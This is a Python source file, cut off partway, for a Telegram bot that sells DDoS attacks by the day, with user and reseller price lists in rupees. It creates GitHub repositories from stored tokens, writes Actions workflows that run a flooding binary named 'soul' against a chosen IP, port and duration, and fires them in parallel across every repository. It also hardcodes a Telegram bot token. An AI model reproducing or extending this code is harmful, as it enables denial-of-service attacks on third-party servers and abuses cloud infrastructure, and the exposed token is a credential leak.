import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8500544070:AAE0lDKam-p-o-f2tygHR4zpoQlCeGSe1U4"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [7374777195]
OWNER_IDS = [7374777195]

WAITING_FOR_BINARY = 1

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
attack_data = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return is_owner(user_id) or str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved(user_id):
    return str(user_id) in approved_users

def get_main_keyboard(user_id):
    """Get keyboard based on user role"""
    keyboard = []
    
    # Common buttons for all approved users
    if is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved(user_id):
        keyboard.append([KeyboardButton("🚀 Launch Attack"), KeyboardButton("📊 Check Status")])
        keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("💳 My Access")])
    
    # Admin/Owner buttons
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton("👥 User Management")])
        keyboard.append([KeyboardButton("📋 Pending Approvals"), KeyboardButton("✅ Approved Users")])
    
    # Owner only buttons
    if is_owner(user_id):
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("⚙️ Bot Settings")])
        keyboard.append([KeyboardButton("🎫 Token Management")])
    
    # Help button for everyone
    keyboard.append([KeyboardButton("❓ Help")])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def create_repository(token, repo_name):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            logger.info(f"Repository {repo_name} already exists for user {user.login}.")
            return repo, False
        except Exception:
            repo = user.create_repo(repo_name, description="DDoS Bot Attack Repository", private=False, auto_init=True)
            logger.info(f"Created repository {repo_name} for user {user.login}.")
            time.sleep(2)
            yml_content = """name: BGM ATTACK
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target IP'
        required: true
      port:
        description: 'Port'
        required: true
      time:
        description: 'Time (seconds)'
        required: true
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Attack
        run: |
          chmod +x soul
          ./soul ${{ github.event.inputs.target }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
"""
            try:
                repo.create_file(YML_FILE_PATH, "Create workflow file", yml_content, branch="main")
                logger.info(f"Created workflow file in {repo_name}.")
            except Exception as e:
                logger.error(f"Error creating workflow file: {e}")
            return repo, True
    except Exception as e:
        logger.error(f"Error in create_repository: {e}")
        raise

def update_yml_file_and_trigger(token, repo_name, ip, port, time_val):
    """Update YML file with push trigger to automatically start attack"""
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port} for {time_val}s", yml_content, file_content.sha, branch="main")
        except:
            repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port} for {time_val}s", yml_content, branch="main")
        return True
    except Exception as e:
        logger.error(f"Error updating YML: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    first_name = update.effective_user.first_name or "User"
    chat_id = update.effective_chat.id
    
    # Save group info if in group
    if update.effective_chat.type != 'private':
        groups[str(chat_id)] = {
            "group_name": update.effective_chat.title,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_groups(groups)
    
    # Check if user has access
    has_access = is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved(user_id)
    
    if not has_access:
        # Add to pending if not already there
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)
            
            # Notify owners
            for owner_id in owners.keys():
                try:
                    notification = f"""🔔 NEW ACCESS REQUEST

👤 Name: {first_name}
📝 Username: @{username}
🆔 User ID: {user_id}
📅 Date: {time.strftime("%Y-%m-%d %H:%M:%S")}

To approve use:
/add {user_id} 7

Check menu: 📋 Pending Approvals"""
                    await context.bot.send_message(chat_id=int(owner_id), text=notification)
                except Exception as e:
                    logger.error(f"Failed to notify owner {owner_id}: {e}")
        
        # Show access denied message
        denied_msg = f"""❌ ACCESS DENIED

👤 Name: {first_name}
🆔 Your ID: {user_id}
📝 Username: @{username}

⏳ Your request has been sent to admin
⌛ Please wait for approval

💡 Use /myaccess to check status"""
        
        await update.message.reply_text(denied_msg)
        return
    
    # User has access - show welcome
    welcome_message = f"""╔═══════════════════════╗
║  🔥 SERVER FREEZE BOT  🔥  ║
╚═══════════════════════╝

👤 User: @{username}
🆔 ID: {user_id}

⚡ Method: BGM FLOOD
⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}

Select option from menu below 👇"""
    
    keyboard = get_main_keyboard(user_id)
    await update.message.reply_text(welcome_message, reply_markup=keyboard)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    
    user_id = update.effective_user.id
    text = update.message.text
    username = update.effective_user.username or "Unknown"
    
    # Check waiting state
    waiting_for = context.user_data.get('waiting_for')
    
    if waiting_for == 'target':
        # Allow cancel
        if text.lower() in ['cancel', 'c', '/cancel']:
            context.user_data.clear()
            await update.message.reply_text("❌ Attack cancelled\n\nUse menu to try again")
            return
        
        context.user_data['target'] = text
        context.user_data['waiting_for'] = 'port'
        await update.message.reply_text("🔌 Enter PORT number:\n\n💡 Type 'cancel' to abort")
        return
    
    elif waiting_for == 'port':
        # Allow cancel
        if text.lower() in ['cancel', 'c', '/cancel']:
            context.user_data.clear()
            await update.message.reply_text("❌ Attack cancelled\n\nUse menu to try again")
            return
        
        try:
            port = int(text)
            context.user_data['port'] = port
            context.user_data['waiting_for'] = 'time'
            await update.message.reply_text("⏱️ Enter TIME (seconds):\n\n💡 Type 'cancel' to abort")
            return
        except ValueError:
            await update.message.reply_text("❌ Invalid port. Please enter a number:\n\n💡 Type 'cancel' to abort")
            return
    
    elif waiting_for == 'time':
        # Allow cancel
        if text.lower() in ['cancel', 'c', '/cancel']:
            context.user_data.clear()
            await update.message.reply_text("❌ Attack cancelled\n\nUse menu to try again")
            return
        try:
            duration = int(text)
            target = context.user_data.get('target')
            port = context.user_data.get('port')
            
            # Check if attack already running
            with attack_lock:
                if current_attack:
                    await update.message.reply_text("⚠️ Attack already in progress!")
                    context.user_data.clear()
                    return
                
                # Set current attack
                current_attack = {
                    'target': target,
                    'port': port,
                    'duration': duration,
                    'start_time': time.time(),
                    'end_time': time.time() + duration,
                    'username': username,
                    'user_id': user_id
                }
            
            # Start attack on all servers
            progress_msg = await update.message.reply_text("⚡ LAUNCHING ATTACK...\nPlease wait...")
            
            success_count = 0
            fail_count = 0
            results = []
            
            def launch_on_server(token_data):
                try:
                    result = update_yml_file_and_trigger(token_data['token'], token_data['repo'], target, port, duration)
                    results.append(result)
                except Exception as e:
                    logger.error(f"Failed to launch on {token_data['repo']}: {e}")
                    results.append(False)
            
            threads = []
            for token_data in github_tokens:
                thread = threading.Thread(target=launch_on_server, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            success_count = sum(results)
            fail_count = len(results) - success_count
            
            attack_msg = f"""✅ ATTACK LAUNCHED!

🎯 Target: {target}
🔌 Port: {port}
⏱️ Duration: {duration}s
👤 User: @{username}
🚀 Method: BGM FLOOD
✅ Success: {success_count}/{len(github_tokens)} servers

⚡ Attack is running...
Use 📊 Check Status to monitor"""
            
            await progress_msg.edit_text(attack_msg)
            
            # Auto-stop attack after duration
            def auto_stop_attack():
                time.sleep(duration)
                with attack_lock:
                    global current_attack, cooldown_until
                    if current_attack:
                        current_attack = None
                        cooldown_until = time.time() + COOLDOWN_DURATION
                logger.info(f"Attack auto-stopped after {duration}s")
            
            stop_thread = threading.Thread(target=auto_stop_attack, daemon=True)
            stop_thread.start()
            
            context.user_data.clear()
            return
            
        except ValueError:
            await update.message.reply_text("❌ Invalid time. Please enter a number:")
            return
    
    # Handle menu buttons
    if text == "🚀 Launch Attack":
        if MAINTENANCE_MODE:
            await update.message.reply_text("🔧 BOT IS UNDER MAINTENANCE\nPlease try again later.")
            return
        
        if not (is_owner(user_id) or is_admin(user_id) or is_approved(user_id)):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        if current_attack:
            await update.message.reply_text("⚠️ ATTACK IN PROGRESS\nPlease wait for current attack to finish.")
            return
        
        if time.time() < cooldown_until:
            remaining = int(cooldown_until - time.time())
            await update.message.reply_text(f"⏳ COOLDOWN ACTIVE\nPlease wait {remaining}s before next attack")
            return
        
        await update.message.reply_text("🎯 LAUNCH ATTACK\n\nPlease enter target IP:\n\n💡 Type 'cancel' anytime to abort")
        context.user_data['waiting_for'] = 'target'
        return
    
    elif text == "📊 Check Status":
        if current_attack:
            current_time = time.time()
            elapsed = int(current_time - current_attack['start_time'])
            remaining = int(current_attack['end_time'] - current_time)
            
            # If time is over, clear attack
            if remaining <= 0:
                with attack_lock:
                    current_attack = None
                    cooldown_until = time.time() + COOLDOWN_DURATION
                
                await update.message.reply_text(f"✅ ATTACK COMPLETED\n\n⏳ Cooldown active: {COOLDOWN_DURATION}s")
            else:
                status_message = f"""📊 ATTACK STATUS

🎯 Target: {current_attack['target']}
🔌 Port: {current_attack['port']}
⏱️ Duration: {current_attack['duration']}s
⏳ Elapsed: {elapsed}s
⏰ Remaining: {remaining}s
👤 User: {current_attack['username']}
🚀 Method: BGM FLOOD
📈 Status: RUNNING"""
                
                await update.message.reply_text(status_message)
        else:
            now = time.time()
            if now < cooldown_until:
                cooldown_left = int(cooldown_until - now)
                status_message = f"⏳ COOLDOWN ACTIVE\nNext attack available in: {cooldown_left}s"
            else:
                status_message = "✅ READY TO ATTACK\nNo attack in progress"
            
            await update.message.reply_text(status_message)
        return
    
    elif text == "🛑 Stop Attack":
        if not current_attack:
            await update.message.reply_text("❌ NO ATTACK RUNNING")
            return
        
        # Allow owners, admins, and approved users to stop attacks
        if not (is_owner(user_id) or is_admin(user_id) or is_approved(user_id)):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        progress_msg = await update.message.reply_text("🛑 STOPPING ATTACK...\nPlease wait...")
        
        # Stop all workflows
        stopped_count = 0
        results = []
        
        def stop_server(token_data):
            try:
                count = instant_stop_all_jobs(token_data['token'], token_data['repo'])
                results.append(count)
            except:
                results.append(0)
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=stop_server, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        stopped_count = sum(results)
        
        with attack_lock:
            stopped_attack = current_attack.copy() if current_attack else None
            current_attack = None
            cooldown_until = time.time() + COOLDOWN_DURATION
        
        if stopped_attack:
            stop_msg = f"""🛑 ATTACK STOPPED

🎯 Target: {stopped_attack['target']}
🔌 Port: {stopped_attack['port']}
🛑 Workflows cancelled: {stopped_count}
👤 Stopped by: @{username}
⏳ Cooldown: {COOLDOWN_DURATION}s"""
        else:
            stop_msg = "✅ All workflows stopped"
        
        await progress_msg.edit_text(stop_msg)
        return
    
    elif text == "💳 My Access":
        await myaccess_command(update, context)
        return
    
    elif text == "👥 User Management":
        if not (is_owner(user_id) or is_admin(user_id)):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        msg = """👥 USER MANAGEMENT

Available Commands:

➕ /add <user_id> <days>
   Add or approve user access

➖ /remove <user_id>
   Remove user access

📋 View "Pending Approvals" for waiting users
✅ View "Approved Users" for active users

Example: /add 123456789 7"""
        
        await update.message.reply_text(msg)
        return
    
    elif text == "📋 Pending Approvals":
        if not (is_owner(user_id) or is_admin(user_id)):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        if not pending_users:
            await update.message.reply_text("✅ NO PENDING REQUESTS\nAll requests are processed!")
            return
        
        pending_msg = "📋 PENDING APPROVAL REQUESTS\n\n"
        for idx, user in enumerate(pending_users, 1):
            pending_msg += f"{idx}. 👤 {user.get('first_name', 'Unknown')}\n"
            pending_msg += f"   📝 @{user.get('username', 'None')}\n"
            pending_msg += f"   🆔 ID: {user['user_id']}\n"
            pending_msg += f"   📅 Requested: {user['request_date']}\n"
            pending_msg += f"   ✅ Approve: /add {user['user_id']} 7\n\n"
        
        pending_msg += f"📊 Total Pending: {len(pending_users)}"
        
        await update.message.reply_text(pending_msg)
        return
    
    elif text == "✅ Approved Users":
        if not (is_owner(user_id) or is_admin(user_id)):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        if not approved_users:
            await update.message.reply_text("📭 NO APPROVED USERS")
            return
        
        approved_msg = "✅ APPROVED USERS LIST\n\n"
        for idx, (uid, data) in enumerate(approved_users.items(), 1):
            approved_msg += f"{idx}. 🆔 {uid}\n"
            approved_msg += f"   👤 {data.get('username', 'N/A')}\n"
            approved_msg += f"   📅 Added: {data.get('added_date', 'N/A')}\n"
            approved_msg += f"   ⏰ Expires: {data.get('expiry_date', 'N/A')}\n\n"
        
        approved_msg += f"📊 Total: {len(approved_users)}"
        
        await update.message.reply_text(approved_msg)
        return
    
    elif text == "👑 Owner Panel":
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        owner_msg = """👑 OWNER PANEL

Available Commands:

👑 /addowner <user_id>
   Add new owner

❌ /deleteowner <user_id>
   Remove owner

💼 /addreseller <user_id>
   Add reseller

🗑️ /removereseller <user_id>
   Remove reseller

📋 /ownerslist - View all owners
💼 /resellerslist - View all resellers"""
        
        await update.message.reply_text(owner_msg)
        return
    
    elif text == "⚙️ Bot Settings":
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        settings_msg = f"""⚙️ BOT SETTINGS

Current Configuration:
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
👥 Total Users: {len(approved_users)}
🔑 Servers: {len(github_tokens)}

Commands:
🔧 /maintenance - Toggle maintenance
⏱️ /setcooldown <seconds> - Set cooldown
🎯 /setmaxattack <number> - Set max attacks
💰 /pricelist - View prices"""
        
        await update.message.reply_text(settings_msg)
        return
    
    elif text == "🎫 Token Management":
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            return
        
        token_msg = f"""🎫 TOKEN MANAGEMENT

Current Servers: {len(github_tokens)}

Commands:
➕ /addtoken <github_token>
   Add GitHub token (auto detects username & creates repo)

➖ /removetoken <number>
   Remove token by number

📋 /tokenslist - View all tokens

📤 /binary_upload - Upload binary file

Example:
/addtoken ghp_xxxxxxxxxxxx"""
        
        await update.message.reply_text(token_msg)
        return
    
    elif text == "❓ Help":
        await help_command(update, context)
        return

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    help_text = """❓ HELP - BOT COMMANDS

📱 BASIC COMMANDS:
/start - Start bot & show menu
/id - Get your user ID
/myaccess - Check your access details
/help - Show this help message

"""
    
    if is_owner(user_id) or is_admin(user_id):
        help_text += """👑 ADMIN COMMANDS:
/add <user_id> <days> - Approve user
/remove <user_id> - Remove user

Use menu buttons for more options!"""
    
    if is_owner(user_id):
        help_text += """

👑 OWNER COMMANDS:
/addowner <user_id> - Add owner
/deleteowner <user_id> - Remove owner
/addreseller <user_id> - Add reseller
/removereseller <user_id> - Remove reseller
/maintenance - Toggle maintenance mode
/setcooldown <seconds> - Set cooldown
/setmaxattack <number> - Set max attacks
/addtoken <github_token> - Add GitHub token
/removetoken <number> - Remove token
/tokenslist - List all tokens
/binary_upload - Upload binary file"""
    
    await update.message.reply_text(help_text)

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    first_name = update.effective_user.first_name or "User"
    
    id_msg = f"""🆔 YOUR INFORMATION

👤 Name: {first_name}
📝 Username: @{username}
🆔 User ID: `{user_id}`

💡 Share your ID with admin for approval"""
    
    await update.message.reply_text(id_msg)

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_id_str = str(user_id)
    username = update.effective_user.username or "None"
    
    access_info = "💳 YOUR ACCESS INFORMATION\n\n"
    
    if is_owner(user_id):
        owner_data = owners[user_id_str]
        access_info += f"👑 Role: OWNER\n"
        access_info += f"📅 Added: {owner_data.get('added_date', 'N/A')}\n"
        access_info += f"✨ Primary: {'Yes' if owner_data.get('is_primary') else 'No'}\n"
        access_info += f"⏰ Expires: LIFETIME\n"
    elif is_admin(user_id):
        admin_data = admins[user_id_str]
        access_info += f"👨‍💼 Role: ADMIN\n"
        access_info += f"📅 Added: {admin_data.get('added_date', 'N/A')}\n"
        access_info += f"⏰ Expires: LIFETIME\n"
    elif is_reseller(user_id):
        reseller_data = resellers[user_id_str]
        access_info += f"💼 Role: RESELLER\n"
        access_info += f"📅 Added: {reseller_data.get('added_date', 'N/A')}\n"
        access_info += f"⏰ Expires: LIFETIME\n"
    elif is_approved(user_id):
        user_data = approved_users[user_id_str]
        access_info += f"✅ Role: APPROVED USER\n"
        access_info += f"📅 Added: {user_data.get('added_date', 'N/A')}\n"
        access_info += f"⏰ Expires: {user_data.get('expiry_date', 'N/A')}\n"
        
        try:
            expiry = datetime.strptime(user_data.get('expiry_date'), "%Y-%m-%d %H:%M:%S")
            now = datetime.now()
            days_left = (expiry - now).days
            access_info += f"📊 Days Left: {days_left}\n"
        except:
            pass
    else:
        # Check if in pending
        is_pending = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if is_pending:
            access_info += "⏳ Status: PENDING APPROVAL\n"
            access_info += "📝 Your request is waiting for admin approval\n"
        else:
            access_info += "❌ Role: UNAUTHORIZED\n"
            access_info += "📝 Use /start to request access\n"
    
    access_info += f"\n🆔 Your ID: {user_id}\n"
    access_info += f"👤 Username: @{username}\n"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    access_info += f"🎯 Attacks Remaining: {remaining}/{MAX_ATTACKS}"
    
    await update.message.reply_text(access_info)

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /add <user_id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        target_id_str = str(target_id)
        
        # Remove from pending
        global pending_users
        pending_users = [u for u in pending_users if str(u['user_id']) != target_id_str]
        save_pending_users(pending_users)
        
        # Calculate expiry
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        
        # Add to approved
        approved_users[target_id_str] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry_date": expiry_date,
            "days": days
        }
        save_approved_users(approved_users)
        
        # Notify user
        try:
            notification = f"""✅ ACCESS APPROVED!

🎉 Congratulations! Your access has been approved

⏱️ Duration: {days} days
📅 Expires: {expiry_date}

💡 Use /start to begin"""
            await context.bot.send_message(chat_id=target_id, text=notification)
        except:
            pass
        
        success_msg = f"""✅ USER APPROVED!

🆔 User ID: {target_id}
⏱️ Days: {days}
📅 Expires: {expiry_date}
👤 Approved by: {user_id}

User has been notified!"""
        
        await update.message.reply_text(success_msg)
        
    except ValueError:
        await update.message.reply_text("❌ Invalid format. Use: /add <user_id> <days>")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /remove <user_id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            user_data = approved_users[target_id]
            del approved_users[target_id]
            save_approved_users(approved_users)
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=int(target_id),
                    text="❌ ACCESS REMOVED\n\nYour access has been revoked by admin.\nContact admin for more information."
                )
            except:
                pass
            
            await update.message.reply_text(f"""✅ USER REMOVED

🆔 ID: {target_id}
👤 Username: {user_data.get('username', 'N/A')}

User has been notified.""")
        else:
            await update.message.reply_text("❌ User not found in approved list")
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    users_msg = "📊 ALL USERS STATS\n\n"
    users_msg += f"📋 Pending Requests: {len(pending_users)}\n"
    users_msg += f"✅ Approved Users: {len(approved_users)}\n"
    users_msg += f"👑 Owners: {len(owners)}\n"
    users_msg += f"💼 Resellers: {len(resellers)}\n\n"
    
    # Price lists
    users_msg += "💰 USER PRICE LIST:\n"
    for days, price in USER_PRICES.items():
        users_msg += f"  {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
    users_msg += "\n"
    
    users_msg += "💼 RESELLER PRICE LIST:\n"
    for days, price in RESELLER_PRICES.items():
        users_msg += f"  {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
    users_msg += "\n"
    
    users_msg += "Use menu buttons to view detailed lists"
    
    await update.message.reply_text(users_msg)

async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addowner <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        target_id_str = str(target_id)
        
        if target_id_str in owners:
            await update.message.reply_text("⚠️ User is already an owner")
            return
        
        owners[target_id_str] = {
            "username": f"owner_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)
        
        # Notify new owner
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text="👑 OWNER ACCESS GRANTED!\n\nYou have been promoted to OWNER.\nUse /start to access owner panel."
            )
        except:
            pass
        
        await update.message.reply_text(f"✅ OWNER ADDED\n\n🆔 ID: {target_id}\n👤 Added by: {user_id}")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /deleteowner <user_id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id not in owners:
            await update.message.reply_text("❌ User is not an owner")
            return
        
        if owners[target_id].get('is_primary'):
            await update.message.reply_text("⚠️ Cannot remove primary owner")
            return
        
        del owners[target_id]
        save_owners(owners)
        
        await update.message.reply_text(f"✅ OWNER REMOVED\n\n🆔 ID: {target_id}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ ERROR: {str(e)}")

async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addreseller <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        target_id_str = str(target_id)
        
        if target_id_str in resellers:
            await update.message.reply_text("⚠️ User is already a reseller")
            return
        
        resellers[target_id_str] = {
            "username": f"reseller_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_resellers(resellers)
        
        # Notify new reseller
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text="💼 RESELLER ACCESS GRANTED!\n\nYou have been promoted to RESELLER.\nUse /start to begin."
            )
        except:
            pass
        
        await update.message.reply_text(f"✅ RESELLER ADDED\n\n🆔 ID: {target_id}\n👤 Added by: {user_id}")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /removereseller <user_id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id not in resellers:
            await update.message.reply_text("❌ User is not a reseller")
            return
        
        del resellers[target_id]
        save_resellers(resellers)
        
        await update.message.reply_text(f"✅ RESELLER REMOVED\n\n🆔 ID: {target_id}")
        
    except Exception as e:
